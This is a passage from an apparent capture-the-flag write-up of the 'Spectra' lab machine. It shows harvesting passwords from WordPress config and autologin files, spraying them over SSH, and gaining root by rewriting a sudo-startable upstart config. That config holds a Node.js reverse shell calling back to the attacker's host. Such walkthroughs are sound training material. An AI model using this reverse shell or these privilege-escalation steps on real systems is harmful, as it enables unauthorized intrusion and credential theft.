--r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
-...&lt;SNIP&gt;...
-</code></pre></div><p>All the web files are located in <code>/usr/local/share/nginx/html/</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ find / -type f -name wp-config.php 2&gt;/dev/null
-/usr/local/share/nginx/html/main/wp-config.php
-/usr/local/share/nginx/html/testing/wp-config.php
-/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
-/mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
-</code></pre></div><p>The <code>wp-config.php</code> file for <code>/main</code> has different credentials with the one on <code>/testing</code>. I&rsquo;ll grab these credentials.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /usr/local/share/nginx/html/main/wp-config.php
-...&lt;SNIP&gt;...
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database <span style="color:#66d9ef">for</span> WordPress */
-define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;
-
-/** MySQL database username */
-define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;
-
-/** MySQL database password */
-define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;development01&#39;</span> <span style="color:#f92672">)</span>;
-...&lt;SNIP&gt;...
-</code></pre></div><p>In <code>/opt</code>, there is a file with uncommon extension called <code>autologin.conf.orig</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ cat autologin.conf.orig 
-<span style="color:#75715e"># Copyright 2016 The Chromium OS Authors. All rights reserved.</span>
-<span style="color:#75715e"># Use of this source code is governed by a BSD-style license that can be</span>
-<span style="color:#75715e"># found in the LICENSE file.</span>
-description   <span style="color:#e6db74">&#34;Automatic login at boot&#34;</span>
-author        <span style="color:#e6db74">&#34;chromium-os-dev@chromium.org&#34;</span>
-<span style="color:#75715e"># After boot-complete starts, the login prompt is visible and is accepting</span>
-<span style="color:#75715e"># input.</span>
-start on started boot-complete
-script
-  passwd<span style="color:#f92672">=</span>
-  <span style="color:#75715e"># Read password from file. The file may optionally end with a newline.</span>
-  <span style="color:#66d9ef">for</span> dir in /mnt/stateful_partition/etc/autologin /etc/autologin; <span style="color:#66d9ef">do</span>
-    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -e <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-      passwd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>dir<span style="color:#e6db74">}</span><span style="color:#e6db74">/passwd&#34;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
-      break
-    <span style="color:#66d9ef">fi</span>
-  <span style="color:#66d9ef">done</span>
-  <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>passwd<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
-    exit <span style="color:#ae81ff">0</span>
-  <span style="color:#66d9ef">fi</span>
-...&lt;SNIP&gt;...
-</code></pre></div><p>Based on the comments, the file is an autologin script. It looks for <code>passwd</code> file in these directories:</p>
-<ul>
-<li><code>/mnt/stateful_partition/etc/autologin</code></li>
-<li><code>/etc/autologin</code></li>
-</ul>
-<p>And the <code>passwd</code> file in <code>/etc/autologin/</code> directory contains a password.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra /opt $ ls -l /etc/autologin/             
-total <span style="color:#ae81ff">4</span>
--rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">19</span> Feb  <span style="color:#ae81ff">3</span> 16:43 passwd
-nginx@spectra /opt $ cat /etc/autologin/passwd 
-SummerHereWeCome!!
-</code></pre></div><h4 id="ssh---katie">SSH - katie</h4>
-<p>I&rsquo;ll spray <code>SummerHereWeCome!!</code> and <code>development01</code> using <code>crackmapexec</code> to the users who have login shell.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ crackmapexec ssh 10.10.10.229 -u users.list -p passwords.list
-SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.1
-SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
-SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
-SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> chronos:SummerHereWeCome!! Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
-SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:devteam01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
-SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> katie:development01 Bad authentication type; allowed types: <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;publickey&#39;</span>, <span style="color:#e6db74">&#39;keyboard-interactive&#39;</span><span style="color:#f92672">]</span>
-SSH         10.10.10.229    <span style="color:#ae81ff">22</span>     10.10.10.229     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> katie:SummerHereWeCome!!
-</code></pre></div><p>The password <code>SummerHereWeCome!!</code> works on user <code>katie</code> .</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ ssh katie@10.10.10.229
-Password: 
-katie@spectra ~ $ id 
-uid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20157<span style="color:#f92672">(</span>katie<span style="color:#f92672">)</span>,20158<span style="color:#f92672">(</span>developers<span style="color:#f92672">)</span>
-</code></pre></div><p>User flag is done here.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ ls -la
-total <span style="color:#ae81ff">36</span>
-drwxr-xr-x <span style="color:#ae81ff">5</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .
-drwxr-xr-x <span style="color:#ae81ff">8</span> root  root  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">2</span> 15:55 ..
-lrwxrwxrwx <span style="color:#ae81ff">1</span> root  root     <span style="color:#ae81ff">9</span> Feb  <span style="color:#ae81ff">2</span> 15:55 .bash_history -&gt; /dev/null
--rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">127</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_logout
--rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">204</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bash_profile
--rw-r--r-- <span style="color:#ae81ff">1</span> katie katie  <span style="color:#ae81ff">551</span> Dec <span style="color:#ae81ff">22</span> 05:46 .bashrc
-drwx------ <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> May <span style="color:#ae81ff">15</span> 12:17 .gnupg
-drwx------ <span style="color:#ae81ff">3</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 .pki
-drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
--r-------- <span style="color:#ae81ff">1</span> katie katie   <span style="color:#ae81ff">33</span> Feb  <span style="color:#ae81ff">2</span> 15:57 user.txt
-</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
-<h4 id="internal-enumeration-1">Internal Enumeration</h4>
-<p>The first thing I will check if I have the user&rsquo;s password is the sudo rights, and this user has one on <a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it"><code>initctl</code></a>. Unfortunately, <code>initctl</code> is not listed on GTFObins site, so I&rsquo;ll have to look around.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ sudo -l
-User katie may run the following commands on spectra:
-    <span style="color:#f92672">(</span>ALL<span style="color:#f92672">)</span> SETENV: NOPASSWD: /sbin/initctl
-</code></pre></div><p>Enumerating for files owned by developers discovers some writable <code>.conf</code> files and a JavaScript file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ find / -type f -group developers -ls 2&gt;/dev/null
-    <span style="color:#ae81ff">32121</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test6.conf
-    <span style="color:#ae81ff">32123</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test7.conf
-    <span style="color:#ae81ff">32109</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test3.conf
-    <span style="color:#ae81ff">32112</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test4.conf
-    <span style="color:#ae81ff">32103</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test.conf
-    <span style="color:#ae81ff">32126</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test8.conf
-    <span style="color:#ae81ff">32128</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test9.conf
-    <span style="color:#ae81ff">32106</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test10.conf
-    <span style="color:#ae81ff">32108</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test2.conf
-    <span style="color:#ae81ff">32120</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test5.conf
-    <span style="color:#ae81ff">32105</span>      <span style="color:#ae81ff">4</span> -rw-rw----   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">478</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /etc/init/test1.conf
-    <span style="color:#ae81ff">23763</span>      <span style="color:#ae81ff">4</span> -rwxrwxr-x   <span style="color:#ae81ff">1</span> root     developers      <span style="color:#ae81ff">251</span> Jun <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /srv/nodetest.js
-</code></pre></div><p>Those <code>.conf</code> files are configuration scripts to start <code>/srv/nodetest.js</code>.  This file itself is not that important here.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra ~ $ cat /etc/init/test.conf 
-description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
-author      <span style="color:#e6db74">&#34;katie&#34;</span>
-
-start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
-stop on shutdown
-
-script
-
-    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
-    echo $$ &gt; /var/run/nodetest.pid
-    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
-
-end script
-
-pre-start script
-    echo <span style="color:#e6db74">&#34;[`date`] Node Test Starting&#34;</span> &gt;&gt; /var/log/nodetest.log
-end script
-
-pre-stop script
-    rm /var/run/nodetest.pid
-    echo <span style="color:#e6db74">&#34;[`date`] Node Test Stopping&#34;</span> &gt;&gt; /var/log/nodetest.log
-end script
-</code></pre></div><h4 id="abusing-sudo-initctl">Abusing sudo initctl</h4>
-<p>With sudo privileges and write access on those configuration files, I can perform a command injection to send myself a root shell.</p>
-<p>In this write-up, I&rsquo;d like to try injecting a <a href="https://gtfobins.github.io/gtfobins/node/#sudo">node</a> reverse shell.</p>
-<p>First, I&rsquo;ll create a copy of the configuration file, which contains reverse shell to my machine without the pre and post script part. I&rsquo;ll name it <code>exploit.conf</code>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
-$ cat exploit.conf
-description <span style="color:#e6db74">&#34;Test node.js server&#34;</span>
-author      <span style="color:#e6db74">&#34;katie&#34;</span>
-
-start on filesystem or runlevel <span style="color:#f92672">[</span>2345<span style="color:#f92672">]</span>
-stop on shutdown
-
-script
-
-    export HOME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/srv&#34;</span>
-    echo $$ &gt; /var/run/nodetest.pid
-    export RHOST<span style="color:#f92672">=</span>10.10.14.21
-    export RPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span>
-    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node -e <span style="color:#e6db74">&#39;sh = child_process.spawn(&#34;/bin/sh&#34;); net.connect(process.env.RPORT, process.env.RHOST, function () {
-</span><span style="color:#e6db74">    this.pipe(sh.stdin);
-</span><span style="color:#e6db74">    sh.stdout.pipe(this);
-</span><span style="color:#e6db74">    sh.stderr.pipe(this);
-</span><span style="color:#e6db74">    })&#39;</span>
-    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
-
-end script
-</code></pre></div><p>After that, I&rsquo;ll transfer the file to Spectra in <code>/dev/shm</code> directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.21»
-$ scp exploit.conf katie@10.10.10.229:/dev/shm
-Password:
-bash: warning: /home/katie/.bashrc: warning: script from noexec mount; see https://chromium.googlesource.com/chromiumos/docs/+/master/security/noexec_shell_scripts.md
-exploit.conf                               100%  <span style="color:#ae81ff">775</span>    13.1KB/s   00:00
-</code></pre></div><p>I&rsquo;ll setup a <code>nc</code> listener on my Kali and execute the following command.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">katie@spectra /etc/init $ sudo /sbin/initctl stop test5 2&gt;/dev/null; cat /dev/shm/exploit.conf &gt; test5.conf <span style="color:#f92672">&amp;&amp;</span> sudo /sbin/initctl start test5
-test5 start/running, process <span style="color:#ae81ff">33889</span>
-</code></pre></div><p>If I check my listener, I have a root shell now.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21»
-$ nc -nvlp <span style="color:#ae81ff">9001</span>
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">37220</span>
-id <span style="color:#f92672">&amp;&amp;</span> hostname <span style="color:#f92672">&amp;&amp;</span> ip a
-uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
-spectra
-1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
-    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
-    inet 127.0.0.1/8 scope host lo
-       valid_lft forever preferred_lft forever
-    inet6 ::1/128 scope host
-       valid_lft forever preferred_lft forever
-2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc pfifo_fast state UP group default qlen <span style="color:#ae81ff">1000</span>
-    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
-    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
-       valid_lft forever preferred_lft forever
-    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
-       valid_lft 86303sec preferred_lft 14303sec
-    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
-       valid_lft 86303sec preferred_lft 14303sec
-    inet6 fe80::250:56ff:feb9:b2c/64 scope link
-       valid_lft forever preferred_lft forever
-</code></pre></div><hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
-<li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
-<li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
 </ul>
 ]]></content:encoded>
     </item>
